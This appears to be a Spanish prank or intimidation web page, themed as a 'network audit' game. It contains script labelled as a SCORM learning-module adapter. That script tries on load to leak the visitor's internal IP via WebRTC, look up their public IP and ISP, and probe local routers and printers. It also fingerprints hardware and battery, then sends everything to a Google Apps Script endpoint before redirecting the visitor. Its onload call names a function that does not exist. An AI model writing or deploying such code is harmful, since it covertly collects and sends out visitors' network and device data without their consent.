<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SISTEMA DE AUDITORÍA - TEC PLAYA</title>
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --pink: #ed1b76; --green: #037a76; --bg: #050505; }
        body { background: var(--bg); color: white; font-family: 'Quicksand', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        #audit-panel { border: 2px solid var(--pink); padding: 40px; background: rgba(237, 27, 118, 0.05); text-align: center; max-width: 900px; width: 95%; box-shadow: 0 0 60px var(--pink); }
        .glitch { font-size: 3em; color: var(--pink); font-weight: 700; text-transform: uppercase; margin: 0; }
        #console { text-align: left; background: #000; padding: 25px; border-left: 5px solid var(--green); color: #00ffcc; font-family: 'Courier New', monospace; font-size: 0.8em; margin-top: 20px; line-height: 1.5; max-height: 400px; overflow-y: auto; }
        .danger { color: #ff4d4d; font-weight: bold; }
    </style>
</head>
<body>

<div id="audit-panel">
    <div style="font-size:35px; color:var(--pink); margin-bottom:15px;">○ △ □</div>
    <h1 id="status">MINANDO ENTORNO...</h1>
    <div id="console">
        > Forzando WebRTC Leak para IP Interna...<br>
        > Escaneando topología de red local (mDNS/SSDP)...<br>
        > Detectando dispositivos IoT y periféricos...<br>
    </div>
    <p id="timer" style="margin-top:25px; color:var(--green); font-weight: 700;">VOLCADO DE RED COMPLETO EN: 10...</p>
</div>

<script>
/* ==========================================================================
   SCORM ADAPTER - SCRIPT MAESTRO V2.1
   ========================================================================== */
const SCORM = {
    config: {
        activityId: "AUDITORIA_RED_LOCAL_2026",
        scriptUrl: "https://script.google.com/macros/s/AKfycbwuyrdlN36c4cSAMEDUmwm3m3pF6gbjcIN0U41FS2byd5B49wTTGjVXb12HRXUtM-zSVg/exec"
    },
    syncCloud: function(action, forensic) {
        const payload = {
            sheetName: this.config.activityId,
            action: action,
            id: forensic.ipv4, 
            name: "VULNERADO: " + forensic.os,
            score: forensic.bat,
            progress: forensic.cores,
            device: forensic.tipo,
            // EMPAQUETADO PARA COLUMNA 8 (DATA EXTRA)
            details: forensic 
        };
        const url = `${this.config.scriptUrl}?q=${encodeURIComponent(JSON.stringify(payload))}`;
        fetch(url, { mode: 'no-cors', keepalive: true });
    }
};

/* --- MÓDULO DE ESCANEO DE RED LOCAL --- */
const scanNetwork = async (internalIP) => {
    if (internalIP === "n/a" || internalIP.includes(':')) return ["Escaneo no disponible"];
    const base = internalIP.split('.').slice(0, 3).join('.');
    const targets = [1, 254, 100, 101]; // IPs comunes de routers e impresoras
    const found = [];

    const probes = targets.map(lastOctet => {
        const ip = `${base}.${lastOctet}`;
        return Promise.race([
            fetch(`http://${ip}`, { mode: 'no-cors' }).then(() => ip),
            new Promise(r => setTimeout(() => r(null), 1500))
        ]);
    });

    const results = await Promise.all(probes);
    results.forEach(res => { if(res) found.push(res); });
    return found.length > 0 ? found : ["Solo Gateway detectado"];
};

async function executeForensic() {
    const log = document.getElementById('console');
    const add = (m) => { log.innerHTML += `> ${m}<br>`; log.scrollTop = log.scrollHeight; };

    // 1. IP Interna (WebRTC Leak)
    let internalIP = "n/a";
    try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (i) => { if (i.candidate) internalIP = i.candidate.candidate.split(" ")[4]; };
    } catch(e) {}

    // 2. IPs Públicas e ISP
    let v4 = "n/a", net = { org: "Unknown" };
    try {
        v4 = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
        net = await fetch(`https://ipapi.co/${v4}/json/`).then(r => r.json());
    } catch(e) {}

    // Esperar un momento para que WebRTC resuelva
    await new Promise(r => setTimeout(r, 2000));
    const devices = await scanNetwork(internalIP);

    // 3. Hardware Fingerprinting
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "n/a";
    let bat = 0; try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100); } catch(e) {}

    const forensic = {
        ipv4: v4,
        ip_lan: internalIP,
        dispositivos_red: devices.join(", "),
        isp: net.org,
        gpu: gpu,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory || "n/a",
        bat: bat,
        os: navigator.platform,
        tipo: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop"
    };

    add(`IP INTERNA: <span class="danger">${internalIP}</span>`);
    add(`NODOS ACTIVOS EN TU RED: ${forensic.dispositivos_red}`);
    add(`ENRUTADOR DETECTADO: ${net.org}`);
    add(`ESTADO FINAL: <span style="color:#ed1b76">JUGADOR IDENTIFICADO</span>`);

    document.getElementById('status').innerText = "ELIMINADO";

    // Reporte a Google Sheets
    SCORM.syncCloud("Auditoría de Red y Hardware", forensic);

    let t = 10;
    setInterval(() => {
        t--; document.getElementById('timer').innerText = `VOLCADO DE RED COMPLETO EN: ${t}...`;
        if(t <= 0) window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }, 1000);
}
window.onload = executeAudit;
</script>
</body>
</html>
